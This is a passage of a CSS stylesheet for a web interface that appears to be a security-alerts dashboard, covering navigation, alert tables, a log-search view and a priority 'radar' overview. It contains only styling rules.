text-transform:uppercase;letter-spacing:.06em;color:var(--ink-4)}\n.nav-group-h svg{color:var(--ink-5);opacity:.85}\n.nav-group-h .cnt{margin-left:auto;background:var(--bg-2);color:var(--ink-3);border-radius:var(--r-pill);\n  padding:1px 7px;font-size:10.5px;letter-spacing:0}\n.nav-group-h .hint{margin-left:auto;font-size:10px;font-weight:500;text-transform:none;letter-spacing:0;color:var(--ink-4)}\n\n.nav-item{display:flex;gap:11px;padding:9px 11px;border-radius:var(--r-sm);cursor:pointer;transition:.13s;position:relative}\n.nav-item:hover{background:var(--bg-2)}\n.nav-item.active{background:var(--blue-bg)}\n.nav-item.active::before{content:\"\";position:absolute;left:0;top:8px;bottom:8px;width:3px;border-radius:2px;background:var(--blue)}\n.ni-ic{width:22px;height:22px;border-radius:6px;flex:0 0 auto;display:grid;place-items:center;margin-top:1px;\n  background:color-mix(in srgb, var(--tc) 15%, transparent);color:var(--tc)}\n.ni-body{flex:1;min-width:0}\n.ni-title{display:block;max-width:100%;font-size:13px;font-weight:600;color:var(--ink-0);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}\n.ni-sub{display:flex;align-items:center;gap:6px;margin-top:2px;font-size:11px;color:var(--ink-3)}\n.ni-sub .dot{width:6px;height:6px;border-radius:50%;flex:0 0 auto}\n.ni-id{font-family:var(--mono);font-size:10px;color:var(--ink-4)}\n/* ephemeral chat styling */\n.nav-item.ephemeral .ni-ic{background:transparent;border:1.5px dashed var(--line-strong);color:var(--ink-4)}\n.nav-item.ephemeral .ni-title{font-weight:500;color:var(--ink-2)}\n.nav-row1{display:flex;align-items:center;gap:8px}\n.nav-new{display:inline-flex;align-items:center;gap:8px;height:34px;padding:0 13px;border-radius:var(--r-sm);background:var(--accent-bg);color:var(--accent-d);font-size:13px;font-weight:600;border:1px solid var(--accent-ring);cursor:pointer;transition:.13s}\n.nav-new:hover{background:color-mix(in srgb,var(--accent) 15%,transparent);border-color:color-mix(in srgb,var(--accent) 40%,transparent)}\n.nav-new svg{color:var(--accent)}\n.nav-collapse{margin-left:auto;flex:0 0 auto;width:30px;height:30px;display:grid;place-items:center;border-radius:var(--r-sm);color:var(--ink-4);background:none;border:none;cursor:pointer;transition:.12s}\n.nav-collapse:hover{background:var(--bg-2);color:var(--ink-2)}\n.nav-search-block{margin:0 2px 2px;width:auto;height:34px}\n.nav-search:focus-within{border-color:var(--line-strong);background:var(--panel)}\n.nav-search{flex:1;min-width:0;margin-top:0}\n.nav-iconbtn{flex:0 0 auto;width:32px;height:32px;display:grid;place-items:center;border-radius:var(--r-sm);color:var(--ink-3);border:1px solid var(--line-2);background:var(--panel);transition:.12s;cursor:pointer}\n.nav-iconbtn:hover{border-color:var(--line-strong);background:var(--bg-2);color:var(--accent)}\n.nav-iconbtn.collapse:hover{color:var(--ink-1)}\n.nav-div{width:1px;height:18px;background:var(--line);flex:0 0 auto}\n.nav-menu{display:flex;flex-direction:column;gap:0;padding:4px 2px}\n.nav-menu-item{display:flex;align-items:center;gap:12px;padding:10px 11px;border-radius:var(--r-sm);font-size:13px;font-weight:600;color:var(--ink-2);cursor:pointer;transition:.12s}\n.nav-menu-item:hover{background:var(--bg-2);color:var(--ink-0)}\n.nav-menu-item .nmi-ic{width:20px;display:grid;place-items:center;color:var(--ink-4)}\n.nav-menu-item.on{background:var(--accent-bg);color:var(--accent-d)}\n.nav-menu-item.on .nmi-ic{color:var(--accent)}\n.nav-divide{height:1px;background:var(--line);margin:14px 2px}\n.sidebar-toggle{flex:0 0 auto;width:30px;height:28px;display:grid;place-items:center;border-radius:var(--r-sm);color:var(--ink-3);border:1px solid var(--line-2);background:var(--panel);transition:.12s;cursor:pointer;margin-right:9px}\n.sidebar-toggle:hover{border-color:var(--line-strong);background:var(--bg-2);color:var(--ink-1)}\n.thread.special > .spine,.thread.special > .stream,.thread.special > .composer{display:none}\n.home-special{flex:1;min-height:0;overflow-y:auto}\n.special-top{padding:12px 0 0 16px}\n.special-pad{padding:24px}\n.brief-page{max-width:760px;margin:0 auto;padding:30px 28px 44px;width:100%}\n.bp-head{margin-bottom:6px}\n.bp-eyebrow{display:inline-flex;align-items:center;gap:6px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:var(--accent-d)}\n.bp-eyebrow svg{color:var(--accent)}\n.bp-head h1{font-size:23px;font-weight:700;letter-spacing:-.02em;color:var(--ink-0);margin:9px 0 7px}\n.bp-head p{font-size:13.5px;line-height:1.6;color:var(--ink-2)}\n.bp-sec{margin-top:24px}\n.bp-sec h3{font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.04em;color:var(--ink-3);margin-bottom:9px}\n.bp-item{display:flex;align-items:center;gap:11px;padding:11px 12px;border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);cursor:pointer;transition:.12s;margin-bottom:7px}\n.bp-item:hover{border-color:var(--line-strong);box-shadow:var(--sh-xs)}\n.bp-item .ni-ic{width:26px;height:26px}\n.bp-it{flex:1;min-width:0;display:flex;flex-direction:column;gap:2px}\n.bp-it b{font-size:13px;font-weight:600;color:var(--ink-0);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:block}\n.bp-meta{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--ink-3)}\n.bp-meta .dot{width:6px;height:6px;border-radius:50%}\n.bp-item>svg{color:var(--ink-4);flex:0 0 auto}\n.bp-empty{font-size:12.5px;color:var(--ink-4);padding:8px 2px}\n/* ---- rich agent-fronted brief ---- */\n.home-special.brief-mode{display:flex;flex-direction:column;overflow:hidden}\n.brief-scroll{flex:1;min-height:0;overflow-y:auto}\n.alerts-page{display:block;container-type:inline-size}\n.pg-head{flex:0 0 auto;padding:0 20px;height:51px;display:flex;flex-direction:column;justify-content:center;border-bottom:1px solid var(--line);box-sizing:border-box}\n.pg-title{font-size:15px;font-weight:600;letter-spacing:-.01em;color:var(--ink-0);margin:0;position:relative;top:2px}\n.dash-grid{flex:1;min-height:0}\n.al-filterbtn{display:none;align-items:center;gap:9px;height:38px;padding:0 12px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);font-size:13px;font-weight:500;color:var(--ink-1);cursor:pointer;margin-bottom:16px}\n.al-vizbtn{display:none;align-items:center;gap:9px;height:38px;padding:0 12px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);font-size:13px;font-weight:500;color:var(--ink-1);cursor:pointer;margin-bottom:16px}\n@container (max-width:640px){.alerts-page .al-vizbtn{display:inline-flex}.alerts-page .al-summary{display:none}.alerts-page .al-summary.open{display:block}.alerts-page .al-filters{display:none}.alerts-page .al-filters.open{display:flex;flex-direction:column;align-items:stretch}.alerts-page .al-filters.open .al-filter,.alerts-page .al-filters.open .al-filter.grow{flex:0 0 auto;width:100%}.alerts-page .al-filterbtn{display:inline-flex}}.al-filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px;align-items:center}.al-filter{display:flex;align-items:center;gap:9px;height:38px;padding:0 12px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);font-size:13px;flex:0 0 auto}.al-filter.grow{flex:1;min-width:150px}.al-fl{color:var(--ink-3);font-size:12.5px;flex:0 0 auto}.al-fv{color:var(--ink-0);font-weight:600}.al-fph{color:var(--ink-4);flex:1}.al-fbadge{background:var(--green);color:#fff;font-size:10px;font-weight:700;border-radius:4px;padding:1px 6px;line-height:1.5}.al-fx{color:var(--ink-4);display:inline-flex;margin-left:6px}.al-filter.grow .al-fx{margin-left:auto}.al-fmore{width:34px;height:38px;display:grid;place-items:center;border:none;background:none;color:var(--ink-4);border-radius:var(--r-sm);cursor:pointer}.al-fmore:hover{background:var(--bg-2)}.al-summary{border:1px solid var(--line);border-radius:var(--r-lg);background:var(--panel);padding:16px 18px 20px;margin-bottom:16px;container-type:inline-size}.al-tabs{display:flex;gap:4px;margin-bottom:18px}.al-tab{font-size:13px;font-weight:600;color:var(--ink-3);padding:6px 13px;border-radius:var(--r-sm);background:none;border:none;cursor:pointer;transition:.12s}.al-tab:hover{background:var(--bg-2)}.al-tab.on{background:var(--blue-bg);color:var(--blue-d)}.al-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}\n.al-card:first-child{border-left:none;padding-left:0}\n@container (max-width:720px){.al-cards{grid-template-columns:1fr;gap:0}.al-summary .al-cards>.al-card{border-left:none;padding-left:0;border-top:1px solid var(--line);padding-top:16px;margin-top:16px}.al-summary .al-cards>.al-card:first-child{border-top:none;padding-top:0;margin-top:0}}.al-card{min-width:0}.al-card+.al-card{border-left:1px solid var(--line);padding-left:22px}.al-card-h{font-size:14px;font-weight:600;color:var(--ink-0);margin-bottom:14px;display:flex;align-items:center;gap:8px}.al-fieldpill{display:inline-flex;align-items:center;gap:4px;font-size:11.5px;font-weight:500;color:var(--ink-2);background:var(--bg-2);border-radius:var(--r-sm);padding:3px 8px}.al-sevwrap{display:flex;align-items:center;gap:14px}.al-sevtable{flex:1;border-collapse:collapse;font-size:12.5px}.al-sevtable th{text-align:left;font-size:11px;font-weight:600;color:var(--ink-3);padding:0 0 8px;border-bottom:1px solid var(--line)}.al-sevtable td{padding:8px 0;color:var(--ink-1);border-bottom:1px solid var(--line)}.al-sevtable tr:last-child td{border-bottom:none}.al-sevdot{width:8px;height:8px;border-radius:50%;display:inline-block;margin-right:8px;vertical-align:middle}.al-donut{width:104px;height:104px;border-radius:50%;flex:0 0 auto;display:grid;place-items:center;position:relative}.al-donut::after{content:'';position:absolute;inset:18px;background:var(--panel);border-radius:50%}.al-donuthole{position:relative;z-index:1;text-align:center;line-height:1.2}.al-donuthole b{display:block;font-size:14px;font-weight:700;color:var(--ink-0)}.al-donuthole span{font-size:10.5px;color:var(--ink-3)}.al-nametable{width:100%;border-collapse:collapse;font-size:12.5px}.al-nametable th{text-align:left;font-size:11px;font-weight:600;color:var(--ink-3);padding:0 0 8px;border-bottom:1px solid var(--line)}.al-nametable td{padding:9px 0;border-bottom:1px solid var(--line);color:var(--ink-1)}.al-nametable tr:last-child td{border-bottom:none}.al-byname{max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.al-fieldlabel{font-size:11px;font-weight:600;color:var(--ink-3);border-bottom:1px solid var(--line);padding-bottom:8px;margin-bottom:11px}.al-toplist{display:flex;flex-direction:column;gap:13px}.al-toprow{position:relative;display:flex;flex-direction:column;gap:5px}.al-toplabel{font-size:11.5px;color:var(--ink-1);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:inline-block;max-width:78%}.al-toppct{position:absolute;right:0;top:0;font-size:11.5px;font-weight:700;color:var(--ink-0)}.al-topbar{height:3px;background:var(--bg-2);border-radius:2px;overflow:hidden}.al-topbar i{display:block;height:100%;background:var(--red);border-radius:2px}.al-toolbar{display:flex;flex-direction:column;gap:10px;margin:8px 0 12px}.al-tb-top{display:flex;align-items:center;gap:12px}.al-tb-count{display:flex;align-items:baseline;gap:5px;margin-right:auto;color:var(--ink-3);font-size:13px}.al-tb-count b{font-size:17px;font-weight:600;color:var(--ink-0);letter-spacing:-.02em}.al-tb-controls{display:flex;align-items:center;gap:6px;flex-wrap:wrap}.al-tb-div{width:1px;align-self:stretch;background:var(--line);margin:1px 2px}.al-chip{display:inline-flex;align-items:center;gap:6px;height:28px;padding:0 9px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);font-size:12.5px;font-weight:500;color:var(--ink-1);cursor:pointer;white-space:nowrap;transition:background .15s ease,border-color .15s ease,color .15s ease}.al-chip svg{color:var(--ink-4);flex:0 0 auto}.al-chip:hover{background:var(--bg-2);border-color:var(--ink-4)}.al-chip-view{color:var(--blue-d)}.al-chip-view svg{color:var(--blue)}.al-chip-view:hover{background:var(--blue-bg);border-color:var(--blue)}.al-tbadge{background:var(--bg-2);color:var(--ink-2);font-size:10.5px;font-weight:600;border-radius:999px;padding:1px 7px}.al-link{color:var(--blue-d);cursor:pointer;display:inline-flex;align-items:center;gap:4px}.al-link:hover{text-decoration:underline}.al-tablewrap{border:1px solid var(--line);border-radius:var(--r-md);overflow-x:auto}.al-table{width:100%;min-width:560px}\n.al-table{table-layout:fixed}\n.al-table th,.al-table td{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}\n.al-table th:nth-child(1),.al-table td:nth-child(1){width:34px}\n.al-table th:nth-child(2),.al-table td:nth-child(2){width:88px}\n.al-table th:nth-child(4),.al-table td:nth-child(4){width:72px}\n.al-table th:nth-child(5),.al-table td:nth-child(5){width:76px}\n.al-table th:nth-child(6),.al-table td:nth-child(6){width:88px}\n@container (max-width:600px){.alerts-page .al-col-assignee,.alerts-page .al-col-reason{display:none}.alerts-page .al-table{min-width:0}}.al-table th{font-size:11.5px}.al-check{width:34px;text-align:center}.al-cb{display:inline-block;width:14px;height:14px;border:1.5px solid var(--line-2);border-radius:3px;vertical-align:middle}.al-rulelink{color:var(--blue-d);cursor:pointer;font-weight:500}.al-rulelink:hover{text-decoration:underline}.al-sevtag{display:inline-flex;align-items:center;gap:7px;color:var(--ink-1);font-size:12.5px}.dsc{display:flex;flex-direction:column;height:100%;min-height:0;padding-top:18px}.dsc-bar{display:flex;align-items:center;gap:8px;margin-bottom:14px;flex-wrap:wrap}.dsc-dvlabel{font-size:12.5px;color:var(--ink-3);flex:0 0 auto}.dsc-sel{height:36px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);display:inline-flex;align-items:center;gap:7px;padding:0 12px;font-size:13px;font-weight:600;color:var(--ink-0);cursor:pointer}.dsc-iconbtn{width:36px;height:36px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);display:grid;place-items:center;color:var(--ink-3);cursor:pointer;flex:0 0 auto}.dsc-iconbtn:hover{background:var(--bg-2)}.dsc-kql{flex:1;min-width:160px;height:36px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);display:flex;align-items:center;gap:9px;padding:0 12px;color:var(--ink-4);font-size:13px}\n.dsc-kql>span{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.dsc-time{height:36px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);display:inline-flex;align-items:center;gap:7px;padding:0 12px;font-size:13px;color:var(--ink-1);cursor:pointer;flex:0 0 auto}.dsc-refresh{height:36px;background:var(--blue);color:#fff;border:none;border-radius:var(--r-sm);padding:0 15px;font-weight:600;font-size:13px;display:inline-flex;align-items:center;gap:7px;cursor:pointer;flex:0 0 auto}.dsc-body{flex:1;display:flex;min-height:0;border-top:1px solid var(--line)}.dsc-fields{width:236px;flex:0 0 auto;border-right:1px solid var(--line);padding:14px 12px 14px 0;overflow-y:auto;display:flex;flex-direction:column}.dsc-frail{flex:0 0 auto;width:38px;align-self:stretch;border-right:1px solid var(--line);background:none;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:12px;padding:14px 0;color:var(--ink-3);transition:background .15s ease,color .15s ease}.dsc-frail:hover{background:var(--bg-2);color:var(--ink-1)}.dsc-frail svg{transform:none}.dsc-frail-lbl{writing-mode:vertical-rl;transform:rotate(180deg);font-size:11.5px;font-weight:600;letter-spacing:.02em}.dsc-fsearch{flex:0 0 auto;min-width:0;position:relative;display:flex;align-items:center;gap:8px;height:32px}.dsc-fsearch svg{position:absolute;left:10px;color:var(--ink-4);pointer-events:none}.dsc-fsearch input{width:100%;height:32px;padding:0 10px 0 30px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);color:var(--ink-1);font:inherit;font-size:12.5px;outline:none}.dsc-fsearch input::placeholder{color:var(--ink-4)}.dsc-fsearch input:focus{border-color:var(--blue);box-shadow:0 0 0 1px var(--blue)}\n.dsc-ftop{display:flex;align-items:center;gap:6px}.dsc-favail{display:flex;align-items:center;justify-content:space-between;font-size:12px;font-weight:600;color:var(--ink-1);margin:14px 4px 8px}.dsc-favail-r{display:flex;align-items:center;gap:4px}.dsc-fcollapse{width:22px;height:22px;display:grid;place-items:center;border:none;background:none;color:var(--ink-3);border-radius:var(--r-xs);cursor:pointer}.dsc-fcollapse:hover{background:var(--bg-2);color:var(--ink-1)}.dsc-fcollapse svg{transform:none}.dsc-fcount{background:var(--bg-2);border-radius:999px;font-size:10.5px;padding:1px 7px;color:var(--ink-2);font-weight:600}.dsc-flist{flex:1;min-height:0;display:flex;flex-direction:column;gap:1px}.dsc-field{display:flex;align-items:center;gap:9px;padding:5px 6px;border-radius:var(--r-sm);font-size:12.5px;color:var(--ink-1);cursor:pointer}.dsc-field:hover{background:var(--bg-2)}.dsc-fname{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.dsc-ftype{width:16px;height:16px;border-radius:3px;background:var(--bg-2);color:var(--ink-3);font-size:9px;font-weight:700;line-height:1;display:grid;place-items:center;font-family:var(--mono);flex:0 0 auto}.dsc-ftype svg{width:11px;height:11px}.dsc-ftype.dt-text{color:var(--blue-d);background:var(--blue-bg)}.dsc-ftype.dt-keyword{color:var(--green);background:var(--green-bg)}.dsc-ftype.dt-number{color:var(--violet);background:var(--violet-bg)}.dsc-ftype.dt-date{color:var(--teal);background:var(--teal-bg)}.dsc-ftype.dt-ip{color:var(--red-d);background:var(--red-bg);font-size:8px}.dsc-ftype.dt-geo{color:var(--amber);background:var(--amber-bg)}.dsc-addfield{margin-top:12px;height:36px;border:1px dashed var(--line-2);border-radius:var(--r-sm);background:none;color:var(--ink-2);font-size:12.5px;font-weight:600;display:flex;align-items:center;justify-content:center;gap:7px;cursor:pointer}.dsc-addfield:hover{background:var(--bg-2)}.dsc-main{flex:1;min-width:0;display:flex;flex-direction:column;min-height:0;padding-left:16px}.dsc-htoolbar{display:flex;align-items:center;gap:8px;padding:14px 0 12px}.dsc-pill{height:30px;border:1px solid var(--line-2);border-radius:var(--r-sm);background:var(--panel);display:inline-flex;align-items:center;gap:6px;padding:0 11px;font-size:12.5px;color:var(--ink-1);cursor:pointer}.dsc-hist{height:150px;display:flex;align-items:stretch}.dsc-hgroup{flex:1;display:flex;flex-direction:column;border-left:1px solid var(--line)}.dsc-hgroup:first-child{border-left:none}.dsc-hgbars{flex:1;display:flex;align-items:flex-end;gap:3px;padding:0 5px;min-height:0}.dsc-hbar{flex:1;background:var(--teal);border-radius:1px 1px 0 0;min-width:4px}.dsc-hlabel{font-size:10.5px;color:var(--ink-3);padding:5px 0 0 5px;border-top:1px solid var(--line)}.dsc-hmon{font-size:9.5px;color:var(--ink-4)}.dsc-hcap{text-align:center;font-size:11.5px;color:var(--ink-3);padding:12px 0}.dsc-tabs{display:flex;align-items:center;gap:20px;border-bottom:1px solid var(--line)}.dsc-tab{font-size:13px;font-weight:600;color:var(--ink-3);padding:9px 0;border-bottom:2px solid transparent;cursor:pointer;display:inline-flex;align-items:center;gap:6px}.dsc-tab b{color:inherit;font-weight:600}.dsc-tab.on{color:var(--blue-d);border-bottom-color:var(--blue)}.dsc-sortfields{margin-left:auto;color:var(--ink-2)}.dsc-docs{flex:1;overflow:auto;min-height:0}.dsc-table{width:100%;border-collapse:collapse;font-size:12px}.dsc-table thead th{position:sticky;top:0;background:var(--panel);text-align:left;font-size:11.5px;font-weight:600;color:var(--ink-2);padding:9px 10px;border-bottom:1px solid var(--line);white-space:nowrap}.dsc-drow{border-bottom:1px solid var(--line);cursor:pointer}.dsc-drow:hover{background:var(--bg-2)}.dsc-drow td{padding:9px 10px;vertical-align:top}.dsc-dcheck{width:30px}.dsc-dexp{width:24px;color:var(--ink-4)}.dsc-dtime{white-space:nowrap;color:var(--ink-1);width:1%}.dsc-dsum{color:var(--ink-2);font-size:11.5px;line-height:1.5;word-break:break-word}.dsc-foot{display:flex;align-items:center;gap:10px;padding:10px 2px;font-size:12.5px;color:var(--ink-3);border-top:1px solid var(--line)}.dsc-pages{margin-left:auto;display:flex;align-items:center;gap:2px}.dsc-pg{min-width:24px;height:24px;display:grid;place-items:center;border-radius:var(--r-sm);font-size:12px;color:var(--ink-2);cursor:pointer}.dsc-pg.on{background:var(--blue-bg);color:var(--blue-d);font-weight:700}.radar-page{max-width:760px;margin:0 auto;padding:22px 30px 24px;width:100%}.radar-greet{display:flex;flex-direction:column;align-items:center;text-align:center;gap:0;margin-bottom:22px}.radar-eyebrow{font-size:11px;font-weight:600;letter-spacing:.09em;text-transform:uppercase;color:var(--ink-3);margin-bottom:9px}.radar-hi{font-size:19px;font-weight:600;letter-spacing:-.015em;color:var(--ink-2);line-height:1.4;max-width:600px;text-align:center}.radar-hi b{color:var(--ink-0);font-weight:700}.ov{background:var(--panel);border:1px solid var(--line);border-radius:var(--r-lg);padding:15px 17px 16px;margin-bottom:24px;box-shadow:0 1px 3px rgba(20,23,28,.05)}.ov-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:13px}.ov-eyebrow{display:inline-flex;align-items:center;gap:7px;font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--accent-d)}.ov-eyebrow svg{color:var(--accent-d)}.ov-live{display:inline-flex;align-items:center;gap:7px;font-size:11.5px;color:var(--ink-3);font-family:var(--mono)}.ov-livedot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 0 3px var(--green-bg);animation:ovpulse 2.4s ease-in-out infinite}@keyframes ovpulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.82)}}.ov-stats{display:flex;align-items:stretch;gap:0;margin-bottom:0;background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);overflow:hidden}.ov-stat{flex:1;display:flex;flex-direction:column;align-items:center;gap:3px;padding:16px 8px}.ov-statdiv{width:1px;background:var(--line);align-self:stretch;margin:8px 0}.ov-num{font-family:var(--mono);font-size:25px;font-weight:700;line-height:1;color:var(--ink-2)}.ov-num.crit{color:var(--red-d)}.ov-num.motion{color:var(--amber)}.ov-num.done{color:var(--green)}.ov-stat span{font-size:11px;color:var(--ink-3);font-weight:600;letter-spacing:.01em}.ov-foot{display:flex;gap:0;align-items:stretch;padding-top:14px}.ov-block{display:flex;flex-direction:column;gap:8px;min-width:0}.ov-affected{flex:1;padding-right:18px}.ov-k{font-size:10px;font-weight:700;letter-spacing:.07em;text-transform:uppercase;color:var(--ink-4)}.ov-chips{display:flex;flex-wrap:wrap;gap:6px}.ov-chip{cursor:default}.ov-chip[onclick]{cursor:pointer;transition:border-color .12s,background .12s,box-shadow .12s}.ov-chip[onclick]:not(.on):hover{border-color:color-mix(in srgb,var(--blue) 30%,var(--line-2));background:var(--blue-bg)}.ov-chip.on{background:var(--blue-bg);border-color:var(--blue);color:var(--blue-d);box-shadow:0 1px 3px var(--blue-ring)}.ov-chip.on .ov-dot{background:#fff}.sf-bar{display:flex;align-items:center;gap:9px;margin:0 0 14px;padding:9px 13px;border-radius:var(--r-md);background:var(--blue-bg);border:1px solid color-mix(in srgb,var(--blue) 22%,transparent);font-size:12.5px;color:var(--ink-1)}.sf-bar > svg{color:var(--blue-d);flex:0 0 auto}.sf-bar b{font-weight:600;font-family:var(--mono)}.sf-count{font-size:11px;font-weight:600;color:var(--ink-3);background:var(--panel);border-radius:999px;padding:2px 9px}.sf-clear{margin-left:auto;display:inline-flex;align-items:center;gap:5px;padding:5px 11px;border-radius:var(--r-sm);font-size:12px;font-weight:600;color:var(--blue-d);background:none;border:1px solid color-mix(in srgb,var(--blue) 30%,transparent);cursor:pointer;font-family:inherit;transition:background .12s}.sf-clear:hover{background:var(--panel)}.sf-empty{display:flex;flex-direction:column;align-items:center;gap:8px;padding:40px 20px;color:var(--ink-4);text-align:center}.sf-empty svg{color:var(--ink-5)}.sf-empty p{margin:0;font-size:13px}.sf-empty b{color:var(--ink-2);font-weight:600;font-family:var(--mono)}.ov-chip{display:inline-flex;align-items:center;gap:7px;font-size:12px;font-weight:500;color:var(--ink-1);background:var(--panel);border:1px solid var(--line-2);border-radius:999px;padding:3px 11px 3px 9px;font-family:var(--mono)}.ov-dot{width:6px;height:6px;border-radius:50%;background:var(--ink-3);flex:0 0 auto}.ov-chip-crit .ov-dot{background:var(--red)}.ov-chip-high .ov-dot{background:var(--amber)}.ov-chip-low .ov-dot{background:var(--blue)}.ov-more{color:var(--ink-3);font-family:var(--sans);border-style:dashed}.ov-watch{flex:0 0 auto;max-width:46%;cursor:pointer;border-left:1px solid var(--line);padding-left:18px}.ov-watch-row{display:flex;align-items:center;gap:10px;min-width:0}.ov-watch-row .rad-gauge{margin-left:0}.ov-watch-t{font-size:13px;font-weight:600;color:var(--ink-0);line-height:1.32;letter-spacing:-.01em;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;min-width:0}.ov-watch-id{font-family:var(--mono);font-size:10.5px;color:var(--ink-3);font-weight:500}.ov-watch-arrow{margin-left:auto;color:var(--ink-4);display:inline-flex;flex:0 0 auto;transition:transform .13s,color .13s}.ov-watch:hover .ov-watch-arrow{color:var(--accent-d);transform:translate(2px,-2px)}.ov-watch:hover .ov-watch-t{color:var(--accent-d)}.radar-by{display:inline-flex;align-items:center;justify-content:center;gap:9px;margin:0 0 5px;font-size:12px;color:var(--ink-3)}.rad-mini-bot{width:21px;height:21px;border-radius:6px;display:grid;place-items:center;background:var(--accent-bg);color:var(--accent-d);flex:0 0 auto}@keyframes rad-sun-rise{from{opacity:0;transform:translateY(20px) scale(.9)}to{opacity:1;transform:translateY(0) scale(1)}}.rad-hero-bot{width:56px;height:56px;border-radius:17px;display:grid;place-items:center;background:linear-gradient(155deg,color-mix(in srgb,var(--blue) 15%,var(--panel)),var(--blue-bg));color:var(--blue);margin:0 auto 16px;animation:rad-sun-rise .75s cubic-bezier(.32,.72,0,1) both}.radar-by{letter-spacing:.005em}.radar-inbox{font-size:12.5px;font-weight:500;color:var(--blue-d);cursor:pointer;white-space:nowrap;flex:0 0 auto;padding-top:3px}.radar-inbox:hover{text-decoration:underline}.radar-sec{margin-bottom:22px}.radar-sec-h{display:flex;align-items:center;gap:8px;font-size:11px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--ink-3);margin:0 0 11px 2px}.rad-cnt{font-size:10.5px;font-weight:600;color:var(--ink-3);background:var(--bg-2);border-radius:999px;padding:1px 7px;line-height:1.7}.rad-item{display:flex;gap:13px;align-items:flex-start;padding:14px 15px;border:1px solid var(--line);border-radius:var(--r-md);background:var(--panel);margin-bottom:8px;cursor:pointer;transition:border-color .13s,box-shadow .13s}.rad-rail{display:flex;flex-direction:column;align-items:flex-end;justify-content:space-between;align-self:stretch;flex:0 0 auto;gap:14px;min-width:52px}.rad-scorebox{display:flex;flex-direction:column;align-items:flex-end;gap:1px}.rad-priolabel{font-size:9.5px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--ink-4)}.rad-priolabel.crit{color:var(--red-d)}.rad-priolabel.high{color:var(--amber)}.rad-priolabel.low{color:var(--ink-4)}.rad-hdr{display:flex;align-items:center;gap:9px;padding-bottom:12px;margin-bottom:13px;border-bottom:1px solid var(--line)}.rad-tag{display:inline-flex;align-items:center;font-size:10.5px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;padding:4px 10px;border-radius:999px;color:var(--ink-3);background:var(--bg-2)}.rad-tag.crit{color:var(--red-d);background:var(--red-bg)}\n.rad-tag.low{color:var(--blue-d);background:var(--blue-bg)}.rad-tag.high{color:var(--amber);background:var(--amber-bg)}.rad-sevlabel{font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:var(--ink-3)}.rad-sevlabel.crit{color:var(--red-d)}\n.rad-sevlabel.low{color:var(--blue-d)}.rad-sevlabel.high{color:var(--amber)}.rad-hdr-score{margin-left:auto;font-family:var(--mono);font-size:18px;font-weight:700;line-height:1;color:var(--ink-3)}.rad-hdr-score small{font-size:10px;color:var(--ink-4);font-weight:500}.rad-hdr-score.crit{color:var(--red-d)}.rad-hdr-score.high{color:var(--amber)}.rad-gauge{margin-left:auto;position:relative;display:inline-grid;place-items:center;flex:0 0 auto}.rad-gauge b{position:absolute;font-family:var(--mono);font-size:11.5px;font-weight:700;line-height:1}.rad-gauge svg circle:last-child{transition:stroke-dashoffset .5s cubic-bezier(.32,.72,0,1)}.rad-gauge.feat b{font-size:13px}.rad-item-hdr{flex-direction:column;align-items:stretch;background:linear-gradient(180deg,color-mix(in srgb,var(--sev) 6%,var(--panel)),var(--panel));border-color:color-mix(in srgb,var(--sev) 30%,transparent)}\n.rad-item-hdr .rad-hdr{border-bottom-color:color-mix(in srgb,var(--sev) 20%,transparent)}.rad-item-main{display:flex;align-items:flex-start;gap:13px}.rad-item:hover{border-color:var(--line-2);box-shadow:0 1px 3px rgba(20,23,28,.06)}\n.rad-item-hdr:hover{border-color:color-mix(in srgb,var(--sev) 45%,transparent);box-shadow:0 3px 12px color-mix(in srgb,var(--sev) 15%,transparent)}.rad-ic{width:34px;height:34px;border-radius:9px;flex:0 0 auto;display:grid;place-items:center;background:color-mix(in srgb,var(--tc) 14%,transparent);color:var(--tc)}.rad-body{flex:1;min-width:0}.rad-titlerow{display:flex;align-items:baseline;gap:8px;margin-bottom:4px;flex-wrap:wrap}.rad-title{font-size:14px;font-weight:600;color:var(--ink-0);letter-spacing:-.01em}.rad-id{font-size:11px;font-family:var(--mono);color:var(--ink-3)}.rad-ai{font-size:13px;line-height:1.55;color:var(--ink-2);margin-bottom:7px}.rad-ai b{color:var(--ink-0);font-weight:600}.rad-ai code{font-family:var(--mono);font-size:11.5px;background:var(--bg-2);padding:1px 5px;border-radius:5px;color:var(--ink-1)}.rad-meta{font-size:11.5px;color:var(--ink-3)}.rad-right{display:flex;flex-direction:column;align-items:flex-end;gap:8px;flex:0 0 auto}.rad-score{font-family:var(--mono);font-size:15px;font-weight:700;color:var(--ink-3);line-height:1}.rad-score 